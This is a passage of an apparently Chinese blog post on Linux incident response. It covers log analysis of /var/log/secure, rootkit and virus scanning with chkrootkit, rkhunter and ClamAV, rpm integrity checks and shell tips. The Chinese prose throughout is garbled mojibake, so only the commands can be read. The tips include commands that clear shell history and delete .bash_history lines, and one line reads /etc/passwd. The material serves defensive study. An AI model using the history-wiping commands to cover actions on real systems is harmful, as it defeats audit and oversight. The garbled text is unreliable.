&#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudoæˆæƒæ‰§è¡Œ:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-å·¥å…·ç¯‡"><a href="#0x02-å·¥å…·ç¯‡" class="headerlink" title="0x02 å·¥å…·ç¯‡"></a>0x02 å·¥å…·ç¯‡</h3><h4 id="2-1-RootkitæŸ¥æ€"><a href="#2-1-RootkitæŸ¥æ€" class="headerlink" title="2.1 RootkitæŸ¥æ€"></a>2.1 RootkitæŸ¥æ€</h4><ul><li><p>chkrootkit</p><p>ç½‘å€ï¼š<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•ï¼š</span><br><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#ç¼–è¯‘å®Œæˆæ²¡æœ‰æŠ¥é”™çš„è¯æ‰§è¡Œæ£€æŸ¥</span><br><span class="line">.&#x2F;chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>ç½‘å€ï¼š<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•ï¼š</span><br><span class="line">Wget https:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;rkhunter&#x2F;rkhunter&#x2F;1.4.4&#x2F;rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-ç—…æ¯’æŸ¥æ€"><a href="#2-2-ç—…æ¯’æŸ¥æ€" class="headerlink" title="2.2 ç—…æ¯’æŸ¥æ€"></a>2.2 ç—…æ¯’æŸ¥æ€</h4><ul><li><p>Clamav</p><p>ClamAVçš„å®˜æ–¹ä¸‹è½½åœ°å€ä¸ºï¼š<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>å®‰è£…æ–¹å¼ä¸€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®‰è£…zlibï¼š</span><br><span class="line">wget http:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;libpng&#x2F;zlib&#x2F;1.2.7&#x2F;zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#å®‰è£…ä¸€ä¸‹gccç¼–è¯‘ç¯å¢ƒï¼š yum install gcc</span><br><span class="line">CFLAGS&#x3D;&quot;-O3 -fPIC&quot; .&#x2F;configure --prefix&#x3D; &#x2F;usr&#x2F;local&#x2F;zlib&#x2F;</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2ã€æ·»åŠ ç”¨æˆ·ç»„clamavå’Œç»„æˆå‘˜clamavï¼š</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s &#x2F;bin&#x2F;false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3ã€å®‰è£…Clamav</span><br><span class="line">tar â€“zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;opt&#x2F;clamav --disable-clamav -with-zlib&#x3D;&#x2F;usr&#x2F;local&#x2F;zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4ã€é…ç½®Clamav</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;updata</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;freshclam.log</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;clamd.log</span><br><span class="line">cd &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5ã€ClamAV ä½¿ç”¨ï¼š</span><br><span class="line"> &#x2F;opt&#x2F;clamav&#x2F;bin&#x2F;freshclam å‡çº§ç—…æ¯’åº“</span><br><span class="line">.&#x2F;clamscan â€“h æŸ¥çœ‹ç›¸åº”çš„å¸®åŠ©ä¿¡æ¯</span><br><span class="line">.&#x2F;clamscan -r &#x2F;home  æ‰«ææ‰€æœ‰ç”¨æˆ·çš„ä¸»ç›®å½•å°±ä½¿ç”¨</span><br><span class="line">.&#x2F;clamscan -r --bell -i &#x2F;bin  æ‰«æbinç›®å½•å¹¶ä¸”æ˜¾ç¤ºæœ‰é—®é¢˜çš„æ–‡ä»¶çš„æ‰«æç»“æœ</span><br></pre></td></tr></table></figure><p>å®‰è£…æ–¹å¼äºŒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…</span><br><span class="line">yum install -y clamav</span><br><span class="line">#æ›´æ–°ç—…æ¯’åº“</span><br><span class="line">freshclam</span><br><span class="line">#æ‰«ææ–¹æ³•</span><br><span class="line">clamscan -r &#x2F;etc --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;etcclamav.log</span><br><span class="line">clamscan -r &#x2F;bin --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;binclamav.log</span><br><span class="line">clamscan -r &#x2F;usr --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;usrclamav.log</span><br><span class="line">#æ‰«æå¹¶æ€æ¯’</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;bsd-port</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">clamscan -r --remove  &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin</span><br><span class="line">#æŸ¥çœ‹æ—¥å¿—å‘ç°</span><br><span class="line">cat &#x2F;root&#x2F;usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshellæŸ¥æ€"><a href="#2-3-webshellæŸ¥æ€" class="headerlink" title="2.3 webshellæŸ¥æ€"></a>2.3 webshellæŸ¥æ€</h4><p>linuxç‰ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ²³é©¬webshellæŸ¥æ€ï¼šhttp:&#x2F;&#x2F;www.shellpub.com</span><br><span class="line">æ·±ä¿¡æœWebshellç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼šhttp:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F;backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-checkæ£€æŸ¥"><a href="#2-4-RPM-checkæ£€æŸ¥" class="headerlink" title="2.4 RPM checkæ£€æŸ¥"></a>2.4 RPM checkæ£€æŸ¥</h4><p> ç³»ç»Ÿå®Œæ•´æ€§å¯ä»¥é€šè¿‡rpmè‡ªå¸¦çš„-Vaæ¥æ ¡éªŒæ£€æŸ¥æ‰€æœ‰çš„rpmè½¯ä»¶åŒ…ï¼ŒæŸ¥çœ‹å“ªäº›å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€åˆ‡å‡æ ¡éªŒæ­£å¸¸å°†ä¸ä¼šäº§ç”Ÿä»»ä½•è¾“å‡ºï¼Œå¦‚æœæœ‰ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¾“å‡ºæ ¼å¼æ˜¯8ä½é•¿å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ç”¨ä»¥è¡¨ç¤ºæ–‡ä»¶ä¸RPMæ•°æ®åº“ä¸­ä¸€ç§å±æ€§çš„æ¯”è¾ƒç»“æœ ï¼Œå¦‚æœæ˜¯. (ç‚¹) åˆ™è¡¨ç¤ºæµ‹è¯•é€šè¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">éªŒè¯å†…å®¹ä¸­çš„8ä¸ªä¿¡æ¯çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</span><br><span class="line">        S         æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜</span><br><span class="line">        M         æ–‡ä»¶çš„ç±»å‹æˆ–æ–‡ä»¶çš„æƒé™ï¼ˆrwxï¼‰æ˜¯å¦è¢«æ”¹å˜</span><br><span class="line">        5         æ–‡ä»¶MD5æ ¡éªŒæ˜¯å¦æ”¹å˜ï¼ˆå¯ä»¥çœ‹æˆæ–‡ä»¶å†…å®¹æ˜¯å¦æ”¹å˜ï¼‰</span><br><span class="line">        D         è®¾å¤‡ä¸­ï¼Œä»ä»£ç æ˜¯å¦æ”¹å˜</span><br><span class="line">        L         æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜</span><br><span class="line">        U         æ–‡ä»¶çš„å±ä¸»ï¼ˆæ‰€æœ‰è€…ï¼‰æ˜¯å¦æ”¹å˜</span><br><span class="line">        G         æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜</span><br><span class="line">        T         æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜</span><br></pre></td></tr></table></figure><p>å¦‚æœå‘½ä»¤è¢«æ›¿æ¢äº†ï¼Œå¦‚æœè¿˜åŸå›æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶æå–è¿˜åŸæ¡ˆä¾‹ï¼š</span><br><span class="line">rpm  -qf &#x2F;bin&#x2F;ls  æŸ¥è¯¢lså‘½ä»¤å±äºå“ªä¸ªè½¯ä»¶åŒ…</span><br><span class="line">mv  &#x2F;bin&#x2F;ls &#x2F;tmp  å…ˆæŠŠlsè½¬ç§»åˆ°tmpç›®å½•ä¸‹ï¼Œé€ æˆlså‘½ä»¤ä¸¢å¤±çš„å‡è±¡</span><br><span class="line">rpm2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Packages&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls æå–rpmåŒ…ä¸­lså‘½ä»¤åˆ°å½“å‰ç›®å½•çš„&#x2F;bin&#x2F;lsä¸‹</span><br><span class="line">cp &#x2F;root&#x2F;bin&#x2F;ls  &#x2F;bin&#x2F; æŠŠlså‘½ä»¤å¤åˆ¶åˆ°&#x2F;bin&#x2F;ç›®å½• ä¿®å¤æ–‡ä»¶ä¸¢å¤±</span><br></pre></td></tr></table></figure><h4 id="2-5-linuxå®‰å…¨æ£€æŸ¥è„šæœ¬"><a href="#2-5-linuxå®‰å…¨æ£€æŸ¥è„šæœ¬" class="headerlink" title="2.5 linuxå®‰å…¨æ£€æŸ¥è„šæœ¬"></a>2.5 linuxå®‰å…¨æ£€æŸ¥è„šæœ¬</h4><p>Githubé¡¹ç›®åœ°å€ï¼š</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>å°½ä¿¡ä¹¦ä¸å¦‚æ— ä¹¦ï¼Œå·¥å…·åªæ˜¯è¾…åŠ©ï¼Œåˆ«å¤ªè¿‡äºä¾èµ–ï¼Œå…³é”®åœ¨äºä½ å¦‚ä½•è§£å†³é—®é¢˜çš„æ€è·¯ã€‚</strong></p><h1 id="Linux-æ—¥å¿—åˆ†æ"><a href="#Linux-æ—¥å¿—åˆ†æ" class="headerlink" title="Linux æ—¥å¿—åˆ†æ"></a>Linux æ—¥å¿—åˆ†æ</h1><h3 id="0x00-å‰è¨€-1"><a href="#0x00-å‰è¨€-1" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>Linuxç³»ç»Ÿæ‹¥æœ‰éå¸¸çµæ´»å’Œå¼ºå¤§çš„æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥ä¿å­˜å‡ ä¹æ‰€æœ‰çš„æ“ä½œè®°å½•ï¼Œå¹¶å¯ä»¥ä»ä¸­æ£€ç´¢å‡ºæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚ æœ¬æ–‡ç®€ä»‹ä¸€ä¸‹Linuxç³»ç»Ÿæ—¥å¿—åŠæ—¥å¿—åˆ†ææŠ€å·§ã€‚</p><h3 id="0x01-æ—¥å¿—ç®€ä»‹"><a href="#0x01-æ—¥å¿—ç®€ä»‹" class="headerlink" title="0x01 æ—¥å¿—ç®€ä»‹"></a>0x01 æ—¥å¿—ç®€ä»‹</h3><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/</p><p>æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf</p><table><thead><tr><th align="center">æ—¥å¿—æ–‡ä»¶</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/cups</td><td align="center">è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">è®°å½•é‚®ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/message</td><td align="center">è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</td></tr><tr><td align="center">/var/log/secure</td><td align="center">è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr></tbody></table><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ—¥å¿—ï¼š ç™»å½•å¤±è´¥è®°å½•ï¼š/var/log/btmp //lastb æœ€åä¸€æ¬¡ç™»å½•ï¼š/var/log/lastlog //lastlog ç™»å½•æˆåŠŸè®°å½•: /var/log/wtmp //last ç™»å½•æ—¥å¿—è®°å½•ï¼š/var/log/secure</p><p> ç›®å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼š/var/run/utmp //wã€whoã€users</p><p> å†å²å‘½ä»¤è®°å½•ï¼šhistory ä»…æ¸…ç†å½“å‰ç”¨æˆ·ï¼š history -c</p><h3 id="0x02-æ—¥å¿—åˆ†ææŠ€å·§"><a href="#0x02-æ—¥å¿—åˆ†ææŠ€å·§" class="headerlink" title="0x02 æ—¥å¿—åˆ†ææŠ€å·§"></a>0x02 æ—¥å¿—åˆ†ææŠ€å·§</h3><h4 id="Aã€å¸¸ç”¨çš„shellå‘½ä»¤"><a href="#Aã€å¸¸ç”¨çš„shellå‘½ä»¤" class="headerlink" title="Aã€å¸¸ç”¨çš„shellå‘½ä»¤"></a>Aã€å¸¸ç”¨çš„shellå‘½ä»¤</h4><p>Linuxä¸‹å¸¸ç”¨çš„shellå‘½ä»¤å¦‚ï¼šfindã€grep ã€egrepã€awkã€sed</p><p>å°æŠ€å·§ï¼š</p><p>1ã€grepæ˜¾ç¤ºå‰åå‡ è¡Œä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ ‡å‡†unix&#x2F;linuxä¸‹çš„grepé€šè¿‡ä¸‹é¢åƒæ•°æ§åˆ¶ä¸Šä¸‹æ–‡ï¼š</span><br><span class="line">grep -C 5 foo file æ˜¾ç¤ºfileæ–‡ä»¶é‡ŒåŒ¹é…fooå­—ä¸²é‚£è¡Œä»¥åŠä¸Šä¸‹5è¡Œ</span><br><span class="line">grep -B 5 foo file æ˜¾ç¤ºfooåŠå‰5è¡Œ</span><br><span class="line">grep -A 5 foo file æ˜¾ç¤ºfooåŠå5è¡Œ</span><br><span class="line">æŸ¥çœ‹grepç‰ˆæœ¬å·çš„æ–¹æ³•æ˜¯</span><br><span class="line">grep -V</span><br></pre></td></tr></table></figure><p>2ã€grep æŸ¥æ‰¾å«æœ‰æŸå­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : è¡¨ç¤ºå½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªæ–‡ä»¶å</span><br><span class="line">-r æ˜¯é€’å½’æŸ¥æ‰¾</span><br><span class="line">-n æ˜¯æ˜¾ç¤ºè¡Œå·</span><br><span class="line">-R æŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶åŒ…å«å­ç›®å½•</span><br><span class="line">-i å¿½ç•¥å¤§å°å†™</span><br></pre></td></tr></table></figure><p>3ã€å¦‚ä½•æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æŸå‡ è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#ä»ç¬¬1000è¡Œå¼€å§‹ï¼Œæ˜¾ç¤º2000è¡Œã€‚å³æ˜¾ç¤º1000~2999è¡Œ</span><br></pre></td></tr></table></figure><p>4ã€find /etc -name init</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;åœ¨ç›®å½•&#x2F;etcä¸­æŸ¥æ‰¾æ–‡ä»¶init</span><br></pre></td></tr></table></figure><p>5ã€åªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat &#x2F;etc&#x2F;passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;&#96;  </span><br><span class="line">&#x2F;&#x2F;awk -FæŒ‡å®šåŸŸåˆ†éš”ç¬¦ä¸º&#39;:&#39;ï¼Œå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚</span><br></pre></td></tr></table></figure><p>6ã€sed -i â€˜153,$dâ€™ .bash_history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ é™¤å†å²æ“ä½œè®°å½•ï¼Œåªä¿ç•™å‰153è¡Œ</span><br></pre></td></tr></table></figure><h4 id="Bã€æ—¥å¿—åˆ†ææŠ€å·§"><a href="#Bã€æ—¥å¿—åˆ†ææŠ€å·§" class="headerlink" title="Bã€æ—¥å¿—åˆ†ææŠ€å·§"></a>Bã€æ—¥å¿—åˆ†ææŠ€å·§</h4><p><strong>Aã€/var/log/secure</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e 